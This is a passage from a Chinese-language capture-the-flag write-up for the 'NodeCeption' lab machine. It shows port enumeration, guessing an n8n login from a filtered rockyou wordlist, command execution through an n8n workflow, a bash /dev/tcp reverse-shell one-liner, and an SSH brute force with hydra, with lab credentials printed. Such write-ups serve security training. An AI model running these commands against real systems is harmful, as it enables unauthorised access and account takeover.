\u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e\\x20rel=\\\"icon\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举测试\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e8765\u003c/code\u003e \u003ccode\u003eApache\u003c/code\u003e默认页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e5678\u003c/code\u003e \u003ccode\u003en8n\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003en8n\u003c/code\u003e 可以反弹 \u003ccode\u003eshell\u003c/code\u003e，但是要进入后台，并且需要邮箱和密码\u003c/p\u003e\n\u003ch2\u003e密码爆破\u003c/h2\u003e\n\u003cp\u003e我么寻找一下哪里能找到信息\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e8765\u003c/code\u003e 源码中得到信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"mailto:usuario@maildelctf.com\"\u003eusuario@maildelctf.com\u003c/a\u003e\n希望您已按照说明更改密码。\n请记住：密码至少 8 个字符，至少包含 1 个数字和 1 个大写字母。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e得到一个邮箱和密码策略\u003c/p\u003e\n\u003cp\u003e通过AI 写出正则表达式，然后匹配 \u003ccode\u003erockyou\u003c/code\u003e 前 \u003ccode\u003e5000\u003c/code\u003e 的字典\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  NodeCeption \u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e -n 5000 /usr/share/wordlists/rockyou.txt | grep -P \u003cspan class=\"hljs-string\"\u003e'^(?=.*\\d)(?=.*[A-Z]).{8,}$'\u003c/span\u003e                                                                          \nPassword1\nPASSWORD1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003eusuario@maildelctf.com\u003c/code\u003e:\u003ccode\u003ePassword1\u003c/code\u003e 可以登录进去\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003en8n 后台利用\u003c/h2\u003e\n\u003cp\u003e通过工作流运行命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反弹 \u003ccode\u003eshell\u003c/code\u003e ，这里没法用\u003ccode\u003enc\u003c/code\u003e 弹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/bin/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.5/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsNodeCeption/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e拿到立足点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  NodeCeption nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.56.88: inverse host lookup failed: Unknown host\nconnect to [192.168.56.5] from (UNKNOWN) [192.168.56.88] 48536\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (2231): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nthl@nodeception:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当前目录中可以拿到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethl@nodeception:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nTHL_wxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e一看用户组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethl@nodeception:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1000(thl) gid=1000(thl) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1000(thl),4(adm),24(cdrom),27(\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e),30(dip),46(plugdev),101(lxd)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethl@nodeception:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e thl on nodeception:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser thl may run the following commands on nodeception:\n    (ALL) NOPASSWD: /usr/bin/vi\n    (ALL : ALL) ALL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是执行时需要我们提供密码\u003c/p\u003e\n\u003cp\u003e尝试\u003ccode\u003ehydra\u003c/code\u003e爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  NodeCeption hydra -l thl -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.88 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC \u0026#x26; David Maciejak - Please \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not use \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e military or secret service organizations, or \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 20:54:04\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.88:22/\n[22][ssh] host: 192.168.56.88   login: thl   password: basketball\n1 of 1 target successfully comple
